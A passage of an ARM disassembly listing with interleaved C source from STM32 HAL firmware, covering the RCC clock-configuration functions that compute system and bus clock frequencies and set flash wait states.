 800420c:	4b2e      	ldr	r3, [pc, #184]	; (80042c8 <HAL_RCC_ClockConfig+0x1f0>)
 800420e:	689b      	ldr	r3, [r3, #8]
 8004210:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8004214:	687b      	ldr	r3, [r7, #4]
 8004216:	689b      	ldr	r3, [r3, #8]
 8004218:	492b      	ldr	r1, [pc, #172]	; (80042c8 <HAL_RCC_ClockConfig+0x1f0>)
 800421a:	4313      	orrs	r3, r2
 800421c:	608b      	str	r3, [r1, #8]
    }
  }

  /* Allow decreasing of the number of wait states (because of lower CPU frequency expected) */
  if(FLatency < __HAL_FLASH_GET_LATENCY())
 800421e:	4b29      	ldr	r3, [pc, #164]	; (80042c4 <HAL_RCC_ClockConfig+0x1ec>)
 8004220:	681b      	ldr	r3, [r3, #0]
 8004222:	f003 0307 	and.w	r3, r3, #7
 8004226:	683a      	ldr	r2, [r7, #0]
 8004228:	429a      	cmp	r2, r3
 800422a:	d210      	bcs.n	800424e <HAL_RCC_ClockConfig+0x176>
  {
    /* Program the new number of wait states to the LATENCY bits in the FLASH_ACR register */
    __HAL_FLASH_SET_LATENCY(FLatency);
 800422c:	4b25      	ldr	r3, [pc, #148]	; (80042c4 <HAL_RCC_ClockConfig+0x1ec>)
 800422e:	681b      	ldr	r3, [r3, #0]
 8004230:	f023 0207 	bic.w	r2, r3, #7
 8004234:	4923      	ldr	r1, [pc, #140]	; (80042c4 <HAL_RCC_ClockConfig+0x1ec>)
 8004236:	683b      	ldr	r3, [r7, #0]
 8004238:	4313      	orrs	r3, r2
 800423a:	600b      	str	r3, [r1, #0]

    /* Check that the new number of wait states is taken into account to access the Flash
    memory by reading the FLASH_ACR register */
    if(__HAL_FLASH_GET_LATENCY() != FLatency)
 800423c:	4b21      	ldr	r3, [pc, #132]	; (80042c4 <HAL_RCC_ClockConfig+0x1ec>)
 800423e:	681b      	ldr	r3, [r3, #0]
 8004240:	f003 0307 	and.w	r3, r3, #7
 8004244:	683a      	ldr	r2, [r7, #0]
 8004246:	429a      	cmp	r2, r3
 8004248:	d001      	beq.n	800424e <HAL_RCC_ClockConfig+0x176>
    {
      return HAL_ERROR;
 800424a:	2301      	movs	r3, #1
 800424c:	e036      	b.n	80042bc <HAL_RCC_ClockConfig+0x1e4>
    }
  }

  /*-------------------------- PCLK1 Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK1) == RCC_CLOCKTYPE_PCLK1)
 800424e:	687b      	ldr	r3, [r7, #4]
 8004250:	681b      	ldr	r3, [r3, #0]
 8004252:	f003 0304 	and.w	r3, r3, #4
 8004256:	2b00      	cmp	r3, #0
 8004258:	d008      	beq.n	800426c <HAL_RCC_ClockConfig+0x194>
  {
    assert_param(IS_RCC_PCLK(RCC_ClkInitStruct->APB1CLKDivider));
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE1, RCC_ClkInitStruct->APB1CLKDivider);
 800425a:	4b1b      	ldr	r3, [pc, #108]	; (80042c8 <HAL_RCC_ClockConfig+0x1f0>)
 800425c:	689b      	ldr	r3, [r3, #8]
 800425e:	f423 62e0 	bic.w	r2, r3, #1792	; 0x700
 8004262:	687b      	ldr	r3, [r7, #4]
 8004264:	68db      	ldr	r3, [r3, #12]
 8004266:	4918      	ldr	r1, [pc, #96]	; (80042c8 <HAL_RCC_ClockConfig+0x1f0>)
 8004268:	4313      	orrs	r3, r2
 800426a:	608b      	str	r3, [r1, #8]
  }

  /*-------------------------- PCLK2 Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK2) == RCC_CLOCKTYPE_PCLK2)
 800426c:	687b      	ldr	r3, [r7, #4]
 800426e:	681b      	ldr	r3, [r3, #0]
 8004270:	f003 0308 	and.w	r3, r3, #8
 8004274:	2b00      	cmp	r3, #0
 8004276:	d009      	beq.n	800428c <HAL_RCC_ClockConfig+0x1b4>
  {
    assert_param(IS_RCC_PCLK(RCC_ClkInitStruct->APB2CLKDivider));
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE2, ((RCC_ClkInitStruct->APB2CLKDivider) << 3U));
 8004278:	4b13      	ldr	r3, [pc, #76]	; (80042c8 <HAL_RCC_ClockConfig+0x1f0>)
 800427a:	689b      	ldr	r3, [r3, #8]
 800427c:	f423 5260 	bic.w	r2, r3, #14336	; 0x3800
 8004280:	687b      	ldr	r3, [r7, #4]
 8004282:	691b      	ldr	r3, [r3, #16]
 8004284:	00db      	lsls	r3, r3, #3
 8004286:	4910      	ldr	r1, [pc, #64]	; (80042c8 <HAL_RCC_ClockConfig+0x1f0>)
 8004288:	4313      	orrs	r3, r2
 800428a:	608b      	str	r3, [r1, #8]
  }

  /* Update the SystemCoreClock global variable */
  SystemCoreClock = HAL_RCC_GetSysClockFreq() >> (AHBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos] & 0x1FU);
 800428c:	f000 f824 	bl	80042d8 <HAL_RCC_GetSysClockFreq>
 8004290:	4602      	mov	r2, r0
 8004292:	4b0d      	ldr	r3, [pc, #52]	; (80042c8 <HAL_RCC_ClockConfig+0x1f0>)
 8004294:	689b      	ldr	r3, [r3, #8]
 8004296:	091b      	lsrs	r3, r3, #4
 8004298:	f003 030f 	and.w	r3, r3, #15
 800429c:	490b      	ldr	r1, [pc, #44]	; (80042cc <HAL_RCC_ClockConfig+0x1f4>)
 800429e:	5ccb      	ldrb	r3, [r1, r3]
 80042a0:	f003 031f 	and.w	r3, r3, #31
 80042a4:	fa22 f303 	lsr.w	r3, r2, r3
 80042a8:	4a09      	ldr	r2, [pc, #36]	; (80042d0 <HAL_RCC_ClockConfig+0x1f8>)
 80042aa:	6013      	str	r3, [r2, #0]

  /* Configure the source of time base considering new system clocks settings*/
  status = HAL_InitTick(uwTickPrio);
 80042ac:	4b09      	ldr	r3, [pc, #36]	; (80042d4 <HAL_RCC_ClockConfig+0x1fc>)
 80042ae:	681b      	ldr	r3, [r3, #0]
 80042b0:	4618      	mov	r0, r3
 80042b2:	f7fc ff29 	bl	8001108 <HAL_InitTick>
 80042b6:	4603      	mov	r3, r0
 80042b8:	72fb      	strb	r3, [r7, #11]

  return status;
 80042ba:	7afb      	ldrb	r3, [r7, #11]
}
 80042bc:	4618      	mov	r0, r3
 80042be:	3710      	adds	r7, #16
 80042c0:	46bd      	mov	sp, r7
 80042c2:	bd80      	pop	{r7, pc}
 80042c4:	40022000 	.word	0x40022000
 80042c8:	40021000 	.word	0x40021000
 80042cc:	0800d198 	.word	0x0800d198
 80042d0:	20000000 	.word	0x20000000
 80042d4:	20000004 	.word	0x20000004

080042d8 <HAL_RCC_GetSysClockFreq>:
  *
  *
  * @retval SYSCLK frequency
  */
uint32_t HAL_RCC_GetSysClockFreq(void)
{
 80042d8:	b480      	push	{r7}
 80042da:	b089      	sub	sp, #36	; 0x24
 80042dc:	af00      	add	r7, sp, #0
  uint32_t msirange = 0U, sysclockfreq = 0U;
 80042de:	2300      	movs	r3, #0
 80042e0:	61fb      	str	r3, [r7, #28]
 80042e2:	2300      	movs	r3, #0
 80042e4:	61bb      	str	r3, [r7, #24]
  uint32_t pllvco, pllsource, pllr, pllm;    /* no init needed */
  uint32_t sysclk_source, pll_oscsource;

  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();
 80042e6:	4b3e      	ldr	r3, [pc, #248]	; (80043e0 <HAL_RCC_GetSysClockFreq+0x108>)
 80042e8:	689b      	ldr	r3, [r3, #8]
 80042ea:	f003 030c 	and.w	r3, r3, #12
 80042ee:	613b      	str	r3, [r7, #16]
  pll_oscsource = __HAL_RCC_GET_PLL_OSCSOURCE();
 80042f0:	4b3b      	ldr	r3, [pc, #236]	; (80043e0 <HAL_RCC_GetSysClockFreq+0x108>)
 80042f2:	68db      	ldr	r3, [r3, #12]
 80042f4:	f003 0303 	and.w	r3, r3, #3
 80042f8:	60fb      	str	r3, [r7, #12]

  if((sysclk_source == RCC_CFGR_SWS_MSI) ||
 80042fa:	693b      	ldr	r3, [r7, #16]
 80042fc:	2b00      	cmp	r3, #0
 80042fe:	d005      	beq.n	800430c <HAL_RCC_GetSysClockFreq+0x34>
 8004300:	693b      	ldr	r3, [r7, #16]
 8004302:	2b0c      	cmp	r3, #12
 8004304:	d121      	bne.n	800434a <HAL_RCC_GetSysClockFreq+0x72>
     ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_oscsource == RCC_PLLSOURCE_MSI)))
 8004306:	68fb      	ldr	r3, [r7, #12]
 8004308:	2b01      	cmp	r3, #1
 800430a:	d11e      	bne.n	800434a <HAL_RCC_GetSysClockFreq+0x72>
  {
    /* MSI or PLL with MSI source used as system clock source */

    /* Get SYSCLK source */
    if(READ_BIT(RCC->CR, RCC_CR_MSIRGSEL) == 0U)
 800430c:	4b34      	ldr	r3, [pc, #208]	; (80043e0 <HAL_RCC_GetSysClockFreq+0x108>)
 800430e:	681b      	ldr	r3, [r3, #0]
 8004310:	f003 0308 	and.w	r3, r3, #8
 8004314:	2b00      	cmp	r3, #0
 8004316:	d107      	bne.n	8004328 <HAL_RCC_GetSysClockFreq+0x50>
    { /* MSISRANGE from RCC_CSR applies */
      msirange = READ_BIT(RCC->CSR, RCC_CSR_MSISRANGE) >> RCC_CSR_MSISRANGE_Pos;
 8004318:	4b31      	ldr	r3, [pc, #196]	; (80043e0 <HAL_RCC_GetSysClockFreq+0x108>)
 800431a:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 800431e:	0a1b      	lsrs	r3, r3, #8
 8004320:	f003 030f 	and.w	r3, r3, #15
 8004324:	61fb      	str	r3, [r7, #28]
 8004326:	e005      	b.n	8004334 <HAL_RCC_GetSysClockFreq+0x5c>
    }
    else
    { /* MSIRANGE from RCC_CR applies */
      msirange = READ_BIT(RCC->CR, RCC_CR_MSIRANGE) >> RCC_CR_MSIRANGE_Pos;
 8004328:	4b2d      	ldr	r3, [pc, #180]	; (80043e0 <HAL_RCC_GetSysClockFreq+0x108>)
 800432a:	681b      	ldr	r3, [r3, #0]
 800432c:	091b      	lsrs	r3, r3, #4
 800432e:	f003 030f 	and.w	r3, r3, #15
 8004332:	61fb      	str	r3, [r7, #28]
    }
    /*MSI frequency range in HZ*/
    msirange = MSIRangeTable[msirange];
 8004334:	4a2b      	ldr	r2, [pc, #172]	; (80043e4 <HAL_RCC_GetSysClockFreq+0x10c>)
 8004336:	69fb      	ldr	r3, [r7, #28]
 8004338:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 800433c:	61fb      	str	r3, [r7, #28]

    if(sysclk_source == RCC_CFGR_SWS_MSI)
 800433e:	693b      	ldr	r3, [r7, #16]
 8004340:	2b00      	cmp	r3, #0
 8004342:	d10d      	bne.n	8004360 <HAL_RCC_GetSysClockFreq+0x88>
    {
      /* MSI used as system clock source */
      sysclockfreq = msirange;
 8004344:	69fb      	ldr	r3, [r7, #28]
 8004346:	61bb      	str	r3, [r7, #24]
    if(sysclk_source == RCC_CFGR_SWS_MSI)
 8004348:	e00a      	b.n	8004360 <HAL_RCC_GetSysClockFreq+0x88>
    }
  }
  else if(sysclk_source == RCC_CFGR_SWS_HSI)
 800434a:	693b      	ldr	r3, [r7, #16]
 800434c:	2b04      	cmp	r3, #4
 800434e:	d102      	bne.n	8004356 <HAL_RCC_GetSysClockFreq+0x7e>
  {
    /* HSI used as system clock source */
    sysclockfreq = HSI_VALUE;
 8004350:	4b25      	ldr	r3, [pc, #148]	; (80043e8 <HAL_RCC_GetSysClockFreq+0x110>)
 8004352:	61bb      	str	r3, [r7, #24]
 8004354:	e004      	b.n	8004360 <HAL_RCC_GetSysClockFreq+0x88>
  }
  else if(sysclk_source == RCC_CFGR_SWS_HSE)
 8004356:	693b      	ldr	r3, [r7, #16]
 8004358:	2b08      	cmp	r3, #8
 800435a:	d101      	bne.n	8004360 <HAL_RCC_GetSysClockFreq+0x88>
  {
    /* HSE used as system clock source */
    sysclockfreq = HSE_VALUE;
 800435c:	4b23      	ldr	r3, [pc, #140]	; (80043ec <HAL_RCC_GetSysClockFreq+0x114>)
 800435e:	61bb      	str	r3, [r7, #24]
  else
  {
    /* unexpected case: sysclockfreq at 0 */
  }

  if(sysclk_source == RCC_CFGR_SWS_PLL)
 8004360:	693b      	ldr	r3, [r7, #16]
 8004362:	2b0c      	cmp	r3, #12
 8004364:	d134      	bne.n	80043d0 <HAL_RCC_GetSysClockFreq+0xf8>
    /* PLL used as system clock  source */

    /* PLL_VCO = (HSE_VALUE or HSI_VALUE or MSI_VALUE) * PLLN / PLLM
    SYSCLK = PLL_VCO / PLLR
    */
    pllsource = READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC);
 8004366:	4b1e      	ldr	r3, [pc, #120]	; (80043e0 <HAL_RCC_GetSysClockFreq+0x108>)
 8004368:	68db      	ldr	r3, [r3, #12]
 800436a:	f003 0303 	and.w	r3, r3, #3
 800436e:	60bb      	str	r3, [r7, #8]

    switch (pllsource)
 8004370:	68bb      	ldr	r3, [r7, #8]
 8004372:	2b02      	cmp	r3, #2
 8004374:	d003      	beq.n	800437e <HAL_RCC_GetSysClockFreq+0xa6>
 8004376:	68bb      	ldr	r3, [r7, #8]
 8004378:	2b03      	cmp	r3, #3
 800437a:	d003      	beq.n	8004384 <HAL_RCC_GetSysClockFreq+0xac>
 800437c:	e005      	b.n	800438a <HAL_RCC_GetSysClockFreq+0xb2>
    {
    case RCC_PLLSOURCE_HSI:  /* HSI used as PLL clock source */
      pllvco = HSI_VALUE;
 800437e:	4b1a      	ldr	r3, [pc, #104]	; (80043e8 <HAL_RCC_GetSysClockFreq+0x110>)
 8004380:	617b      	str	r3, [r7, #20]
      break;
 8004382:	e005      	b.n	8004390 <HAL_RCC_GetSysClockFreq+0xb8>

    case RCC_PLLSOURCE_HSE:  /* HSE used as PLL clock source */
      pllvco = HSE_VALUE;
 8004384:	4b19      	ldr	r3, [pc, #100]	; (80043ec <HAL_RCC_GetSysClockFreq+0x114>)
 8004386:	617b      	str	r3, [r7, #20]
      break;
 8004388:	e002      	b.n	8004390 <HAL_RCC_GetSysClockFreq+0xb8>

    case RCC_PLLSOURCE_MSI:  /* MSI used as PLL clock source */
    default:
      pllvco = msirange;
 800438a:	69fb      	ldr	r3, [r7, #28]
 800438c:	617b      	str	r3, [r7, #20]
      break;
 800438e:	bf00      	nop
    }
    pllm = (READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLM) >> RCC_PLLCFGR_PLLM_Pos) + 1U ;
 8004390:	4b13      	ldr	r3, [pc, #76]	; (80043e0 <HAL_RCC_GetSysClockFreq+0x108>)
 8004392:	68db      	ldr	r3, [r3, #12]
 8004394:	091b      	lsrs	r3, r3, #4
 8004396:	f003 0307 	and.w	r3, r3, #7
 800439a:	3301      	adds	r3, #1
 800439c:	607b      	str	r3, [r7, #4]
    pllvco = (pllvco * (READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLN) >> RCC_PLLCFGR_PLLN_Pos)) / pllm;
 800439e:	4b10      	ldr	r3, [pc, #64]	; (80043e0 <HAL_RCC_GetSysClockFreq+0x108>)
 80043a0:	68db      	ldr	r3, [r3, #12]
 80043a2:	0a1b      	lsrs	r3, r3, #8
 80043a4:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 80043a8:	697a      	ldr	r2, [r7, #20]
 80043aa:	fb03 f202 	mul.w	r2, r3, r2
 80043ae:	687b      	ldr	r3, [r7, #4]
 80043b0:	fbb2 f3f3 	udiv	r3, r2, r3
 80043b4:	617b      	str	r3, [r7, #20]
    pllr = ((READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLR) >> RCC_PLLCFGR_PLLR_Pos) + 1U ) * 2U;
 80043b6:	4b0a      	ldr	r3, [pc, #40]	; (80043e0 <HAL_RCC_GetSysClockFreq+0x108>)
 80043b8:	68db      	ldr	r3, [r3, #12]
 80043ba:	0e5b      	lsrs	r3, r3, #25
 80043bc:	f003 0303 	and.w	r3, r3, #3
 80043c0:	3301      	adds	r3, #1
 80043c2:	005b      	lsls	r3, r3, #1
 80043c4:	603b      	str	r3, [r7, #0]
    sysclockfreq = pllvco / pllr;
 80043c6:	697a      	ldr	r2, [r7, #20]
 80043c8:	683b      	ldr	r3, [r7, #0]
 80043ca:	fbb2 f3f3 	udiv	r3, r2, r3
 80043ce:	61bb      	str	r3, [r7, #24]
  }

  return sysclockfreq;
 80043d0:	69bb      	ldr	r3, [r7, #24]
}
 80043d2:	4618      	mov	r0, r3
 80043d4:	3724      	adds	r7, #36	; 0x24
 80043d6:	46bd      	mov	sp, r7
 80043d8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80043dc:	4770      	bx	lr
 80043de:	bf00      	nop
 80043e0:	40021000 	.word	0x40021000
 80043e4:	0800d1b0 	.word	0x0800d1b0
 80043e8:	00f42400 	.word	0x00f42400
 80043ec:	007a1200 	.word	0x007a1200

080043f0 <HAL_RCC_GetHCLKFreq>:
  *
  * @note   The SystemCoreClock CMSIS variable is used to store System Clock Frequency.
  * @retval HCLK frequency in Hz
  */
uint32_t HAL_RCC_GetHCLKFreq(void)
{
 80043f0:	b480      	push	{r7}
 80043f2:	af00      	add	r7, sp, #0
  return SystemCoreClock;
 80043f4:	4b03      	ldr	r3, [pc, #12]	; (8004404 <HAL_RCC_GetHCLKFreq+0x14>)
 80043f6:	681b      	ldr	r3, [r3, #0]
}
 80043f8:	4618      	mov	r0, r3
 80043fa:	46bd      	mov	sp, r7
 80043fc:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004400:	4770      	bx	lr
 8004402:	bf00      	nop
 8004404:	20000000 	.word	0x20000000

08004408 <HAL_RCC_GetPCLK1Freq>:
  * @note   Each time PCLK1 changes, this function must be called to update the
  *         right PCLK1 value. Otherwise, any configuration based on this function will be incorrect.
  * @retval PCLK1 frequency in Hz
  */
uint32_t HAL_RCC_GetPCLK1Freq(void)
{
 8004408:	b580      	push	{r7, lr}
 800440a:	af00      	add	r7, sp, #0
  /* Get HCLK source and Compute PCLK1 frequency ---------------------------*/
  return (HAL_RCC_GetHCLKFreq() >> (APBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_PPRE1) >> RCC_CFGR_PPRE1_Pos] & 0x1FU));
 800440c:	f7ff fff0 	bl	80043f0 <HAL_RCC_GetHCLKFreq>
 8004410:	4602      	mov	r2, r0
 8004412:	4b06      	ldr	r3, [pc, #24]	; (800442c <HAL_RCC_GetPCLK1Freq+0x24>)
 8004414:	689b      	ldr	r3, [r3, #8]
 8004416:	0a1b      	lsrs	r3, r3, #8
 8004418:	f003 0307 	and.w	r3, r3, #7
 800441c:	4904      	ldr	r1, [pc, #16]	; (8004430 <HAL_RCC_GetPCLK1Freq+0x28>)
 800441e:	5ccb      	ldrb	r3, [r1, r3]
 8004420:	f003 031f 	and.w	r3, r3, #31
 8004424:	fa22 f303 	lsr.w	r3, r2, r3
}
 8004428:	4618      	mov	r0, r3
 800442a:	bd80      	pop	{r7, pc}
 800442c:	40021000 	.word	0x40021000
 8004430:	0800d1a8 	.word	0x0800d1a8

08004434 <HAL_RCC_GetPCLK2Freq>:
  * @note   Each time PCLK2 changes, this function must be called to update the
  *         right PCLK2 value. Otherwise, any configuration based on this function will be incorrect.
  * @retval PCLK2 frequency in Hz
  */
uint32_t HAL_RCC_GetPCLK2Freq(void)
{
 8004434:	b580      	push	{r7, lr}
 8004436:	af00      	add	r7, sp, #0
  /* Get HCLK source and Compute PCLK2 frequency ---------------------------*/
  return (HAL_RCC_GetHCLKFreq()>> (APBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_PPRE2) >> RCC_CFGR_PPRE2_Pos] & 0x1FU));
 8004438:	f7ff ffda 	bl	80043f0 <HAL_RCC_GetHCLKFreq>
 800443c:	4602      	mov	r2, r0
 800443e:	4b06      	ldr	r3, [pc, #24]	; (8004458 <HAL_RCC_GetPCLK2Freq+0x24>)
 8004440:	689b      	ldr	r3, [r3, #8]
 8004442:	0adb      	lsrs	r3, r3, #11
 8004444:	f003 0307 	and.w	r3, r3, #7
 8004448:	4904      	ldr	r1, [pc, #16]	; (800445c <HAL_RCC_GetPCLK2Freq+0x28>)
 800444a:	5ccb      	ldrb	r3, [r1, r3]
 800444c:	f003 031f 	and.w	r3, r3, #31
 8004450:	fa22 f303 	lsr.w	r3, r2, r3
}
 8004454:	4618      	mov	r0, r3
 8004456:	bd80      	pop	{r7, pc}
 8004458:	40021000 	.word	0x40021000
 800445c:	0800d1a8 	.word	0x0800d1a8

08004460 <RCC_SetFlashLatencyFromMSIRange>:
            voltage range.
  * @param  msirange  MSI range value from RCC_MSIRANGE_0 to RCC_MSIRANGE_11
  * @retval HAL status
  */
static HAL_StatusTypeDef RCC_SetFlashLatencyFromMSIRange(uint32_t msirange)
{
 8004460:	b580      	push	{r7, lr}
 8004462:	b086      	sub	sp, #24
 8004464:	af00      	add	r7, sp, #0
 8004466:	6078      	str	r0, [r7, #4]
  uint32_t vos;
  uint32_t latency = FLASH_LATENCY_0;  /* default value 0WS */
 8004468:	2300      	movs	r3, #0
 800446a:	613b      	str	r3, [r7, #16]

  if(__HAL_RCC_PWR_IS_CLK_ENABLED())
 800446c:	4b2a      	ldr	r3, [pc, #168]	; (8004518 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 800446e:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004470:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8004474:	2b00      	cmp	r3, #0
 8004476:	d003      	beq.n	8004480 <RCC_SetFlashLatencyFromMSIRange+0x20>
  {
    vos = HAL_PWREx_GetVoltageRange();
 8004478:	f7ff f9a6 	bl	80037c8 <HAL_PWREx_GetVoltageRange>
 800447c:	6178      	str	r0, [r7, #20]
 800447e:	e014      	b.n	80044aa <RCC_SetFlashLatencyFromMSIRange+0x4a>
  }
  else
  {
    __HAL_RCC_PWR_CLK_ENABLE();
 8004480:	4b25      	ldr	r3, [pc, #148]	; (8004518 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004482:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004484:	4a24      	ldr	r2, [pc, #144]	; (8004518 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004486:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 800448a:	6593      	str	r3, [r2, #88]	; 0x58
 800448c:	4b22      	ldr	r3, [pc, #136]	; (8004518 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 800448e:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004490:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8004494:	60fb      	str	r3, [r7, #12]
 8004496:	68fb      	ldr	r3, [r7, #12]
    vos = HAL_PWREx_GetVoltageRange();
 8004498:	f7ff f996 	bl	80037c8 <HAL_PWREx_GetVoltageRange>
 800449c:	6178      	str	r0, [r7, #20]
    __HAL_RCC_PWR_CLK_DISABLE();
 800449e:	4b1e      	ldr	r3, [pc, #120]	; (8004518 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80044a0:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80044a2:	4a1d      	ldr	r2, [pc, #116]	; (8004518 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80044a4:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 80044a8:	6593      	str	r3, [r2, #88]	; 0x58
  }

  if(vos == PWR_REGULATOR_VOLTAGE_SCALE1)
 80044aa:	697b      	ldr	r3, [r7, #20]
 80044ac:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 80044b0:	d10b      	bne.n	80044ca <RCC_SetFlashLatencyFromMSIRange+0x6a>
  {
    if(msirange > RCC_MSIRANGE_8)
 80044b2:	687b      	ldr	r3, [r7, #4]
 80044b4:	2b80      	cmp	r3, #128	; 0x80
 80044b6:	d919      	bls.n	80044ec <RCC_SetFlashLatencyFromMSIRange+0x8c>
    {
      /* MSI > 16Mhz */
      if(msirange > RCC_MSIRANGE_10)
 80044b8:	687b      	ldr	r3, [r7, #4]
 80044ba:	2ba0      	cmp	r3, #160	; 0xa0
 80044bc:	d902      	bls.n	80044c4 <RCC_SetFlashLatencyFromMSIRange+0x64>
      {
        /* MSI 48Mhz */
        latency = FLASH_LATENCY_2; /* 2WS */
 80044be:	2302      	movs	r3, #2
 80044c0:	613b      	str	r3, [r7, #16]
 80044c2:	e013      	b.n	80044ec <RCC_SetFlashLatencyFromMSIRange+0x8c>
      }
      else
      {
        /* MSI 24Mhz or 32Mhz */
        latency = FLASH_LATENCY_1; /* 1WS */
 80044c4:	2301      	movs	r3, #1
 80044c6:	613b      	str	r3, [r7, #16]
 80044c8:	e010      	b.n	80044ec <RCC_SetFlashLatencyFromMSIRange+0x8c>
        latency = FLASH_LATENCY_1; /* 1WS */
      }
      /* else MSI < 8Mhz default FLASH_LATENCY_0 0WS */
    }
#else
    if(msirange > RCC_MSIRANGE_8)
 80044ca:	687b      	ldr	r3, [r7, #4]
 80044cc:	2b80      	cmp	r3, #128	; 0x80
 80044ce:	d902      	bls.n	80044d6 <RCC_SetFlashLatencyFromMSIRange+0x76>
    {
      /* MSI > 16Mhz */
      latency = FLASH_LATENCY_3; /* 3WS */
 80044d0:	2303      	movs	r3, #3
 80044d2:	613b      	str	r3, [r7, #16]
 80044d4:	e00a      	b.n	80044ec <RCC_SetFlashLatencyFromMSIRange+0x8c>
    }
    else
    {
      if(msirange == RCC_MSIRANGE_8)
 80044d6:	687b      	ldr	r3, [r7, #4]
 80044d8:	2b80      	cmp	r3, #128	; 0x80
 80044da:	d102      	bne.n	80044e2 <RCC_SetFlashLatencyFromMSIRange+0x82>
      {
        /* MSI 16Mhz */
        latency = FLASH_LATENCY_2; /* 2WS */
 80044dc:	2302      	movs	r3, #2
 80044de:	613b      	str	r3, [r7, #16]
 80044e0:	e004      	b.n	80044ec <RCC_SetFlashLatencyFromMSIRange+0x8c>
      }
      else if(msirange == RCC_MSIRANGE_7)
 80044e2:	687b      	ldr	r3, [r7, #4]
 80044e4:	2b70      	cmp	r3, #112	; 0x70
 80044e6:	d101      	bne.n	80044ec <RCC_SetFlashLatencyFromMSIRange+0x8c>
      {
        /* MSI 8Mhz */
        latency = FLASH_LATENCY_1; /* 1WS */
 80044e8:	2301      	movs	r3, #1
 80044ea:	613b      	str	r3, [r7, #16]
      /* else MSI < 8Mhz default FLASH_LATENCY_0 0WS */
    }
#endif
  }

  __HAL_FLASH_SET_LATENCY(latency);
 80044ec:	4b0b      	ldr	r3, [pc, #44]	; (800451c <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 80044ee:	681b      	ldr	r3, [r3, #0]
 80044f0:	f023 0207 	bic.w	r2, r3, #7
 80044f4:	4909      	ldr	r1, [pc, #36]	; (800451c <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 80044f6:	693b      	ldr	r3, [r7, #16]
 80044f8:	4313      	orrs	r3, r2
 80044fa:	600b      	str	r3, [r1, #0]

  /* Check that the new number of wait states is taken into account to access the Flash
     memory by reading the FLASH_ACR register */
  if(__HAL_FLASH_GET_LATENCY() != latency)
 80044fc:	4b07      	ldr	r3, [pc, #28]	; (800451c <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 80044fe:	681b      	ldr	r3, [r3, #0]
 8004500:	f003 0307 	and.w	r3, r3, #7
 8004504:	693a      	ldr	r2, [r7, #16]
 8004506:	429a      	cmp	r2, r3
 8004508:	d001      	beq.n	800450e <RCC_SetFlashLatencyFromMSIRange+0xae>
  {
    return HAL_ERROR;
 800450a:	2301      	movs	r3, #1
 800450c:	e000      	b.n	8004510 <RCC_SetFlashLatencyFromMSIRange+0xb0>
  }

  return HAL_OK;
 800450e:	2300      	movs	r3, #0
}
 8004510:	4618      	mov	r0, r3
 8004512:	3718      	adds	r7, #24
 8004514:	46bd      	mov	sp, r7
 8004516:	bd80      	pop	{r7, pc}
 8004518:	40021000 	.word	0x40021000
 800451c:	40022000 	.word	0x40022000

08004520 <HAL_RCCEx_PeriphCLKConfig>:
  *         the RTC clock source: in this case the access to Backup domain is enabled.
  *
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_RCCEx_PeriphCLKConfig(RCC_PeriphCLKInitTypeDef  *PeriphClkInit)
{
 8004520:	b580      	push	{r7, lr}
 8004522:	b086      	sub	sp, #24
 8004524:	af00      	add	r7, sp, #0
 8004526:	6078      	str	r0, [r7, #4]
  uint32_t tmpregister, tickstart;     /* no init needed */
  HAL_StatusTypeDef ret = HAL_OK;      /* Intermediate status */
 8004528:	2300      	movs	r3, #0
 800452a:	74fb      	strb	r3, [r7, #19]
  HAL_StatusTypeDef status = HAL_OK;   /* Final status */
 800452c:	2300      	movs	r3, #0
 800452e:	74bb      	strb	r3, [r7, #18]
  assert_param(IS_RCC_PERIPHCLOCK(PeriphClkInit->PeriphClockSelection));

#if defined(SAI1)

  /*-------------------------- SAI1 clock source configuration ---------------------*/
  if((((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_SAI1) == RCC_PERIPHCLK_SAI1))
 8004530:	687b      	ldr	r3, [r7, #4]
 8004532:	681b      	ldr	r3, [r3, #0]
 8004534:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8004538:	2b00      	cmp	r3, #0
 800453a:	d031      	beq.n	80045a0 <HAL_RCCEx_PeriphCLKConfig+0x80>
  {
    /* Check the parameters */
    assert_param(IS_RCC_SAI1CLK(PeriphClkInit->Sai1ClockSelection));

    switch(PeriphClkInit->Sai1ClockSelection)
 800453c:	687b      	ldr	r3, [r7, #4]
